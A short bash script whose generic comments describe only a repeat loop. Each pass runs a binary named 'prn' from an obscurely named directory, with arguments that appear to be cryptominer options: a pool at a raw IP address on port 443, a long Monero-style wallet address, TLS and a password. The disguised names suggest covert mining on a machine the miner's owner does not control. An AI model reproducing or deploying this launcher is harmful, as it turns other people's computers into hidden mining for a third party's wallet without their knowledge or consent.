#!/bin/bash

# Set the number of iterations
iterations=100

# Set the command to be executed
command="cd phhn/ah && ./prn -o 95.179.241.203:443 -u 85a5qsVSC9H6xxY57AQvrHaaToUkdeZKH8t9Wf2NhAWwfxXcq4SrLWj4a6b8WPzEDMKmRbNX5h52118dho1SPGH59oBCYJB -k --tls -p pen"

# Loop through the specified number of iterations
for ((i=1; i<=$iterations; i++)); do
    # Execute the command
    $command

    # Check if it's the last iteration
    if [ $i -lt $iterations ]; then
        echo "Pausing for 10 seconds..."
        sleep 10
    fi
done
